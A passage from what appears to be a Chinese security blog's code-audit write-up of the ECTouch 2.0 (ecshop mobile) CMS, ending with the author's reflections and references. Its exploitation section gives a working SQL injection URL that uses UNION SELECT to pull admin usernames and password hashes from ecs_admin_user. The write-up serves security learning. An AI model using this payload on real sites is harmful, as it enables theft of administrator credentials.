                </div></td>
            </tr>
            <tr>
              <td>{$lang['item_url']}:</td>
              <td><div class="col-md-4">
                  <input type='text' name='data[url]' maxlength="100" value='{$info['url']}' class="form-control input-sm" />
    

这里的变量就会被返回结果给替换掉。

模版渲染原理有点大块头,后面如果挖掘代码注入之类的,我再进行详细的解读。

####  0x6.1 如何利用

`select * from ecs_touch_nav where id=1` 可以知道有10列,直接构造

`http://127.0.0.1:8888/ecshop/upload/mobile/index.php?m=admin&c=navigator&a=edit&id=-1
union select 1,2,3,password,5,6,7,user_name,9,10 from ecs_admin_user`

![](https://ws4.sinaimg.cn/large/006tNbRwgy1fyqj6rnapej31z20nmwhz.jpg)

mysql运行的语句是:

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fyqj9yp4fvj31ds070wib.jpg)

到这里如果你还不理解,你就可以尝试代入payload重新阅读本菜鸡的代码。

## 0x7 感受

这里首先非常感谢phpoop师傅在先知发的文章让我有了动力,去尝试系统地审计一个cms,但是审计的过程也发现自己真的很菜,首先对tp框架不熟悉(代码能力真的菜),对漏洞了解真的少,没有那种感觉,不像师傅轻轻松松很容易发现前台注入,代码执行那种高危漏洞。

最后希望有师傅能指点下我的代码审计, **这也是我写这个文章的初衷**

挖掘这个cms的起因是在补天看到比较多的注入点还有个xxe但是不清楚版本,也不清楚是前台还是后台注入

当时脑子一热找下了模版堂的安装包,安装过程的时候发现是ECTOUCH2.0版本的,

程序代码我上传到了githud地址:[ **CodeCheck** ](https://github.com/mstxq17/CodeCheck/)

希望师傅们有空可以审计下,指点下我,这个cms我会继续研究和分析下去,也会继续把文章写下去

当作我学习php代码审计一个起点。

## 0x8 参考文章

[PbootCMS漏洞合集之审计全过程之一-网站基本架构](https://xz.aliyun.com/t/3530)

[PbootCMS漏洞合集之审计全过程之二-了解系统参数与底层过滤情况](https://xz.aliyun.com/t/3531)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **xq17** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/168991](/post/id/168991)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [代码审计](/tag/代码审计)
  * [PHP](/tag/PHP)

 **+1** __8赞

 __收藏

![](https://q.qlogo.cn/qqapp/101431079/FB5738D77CCE7E738CDE1AA49ED6757A/40)
xq17

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

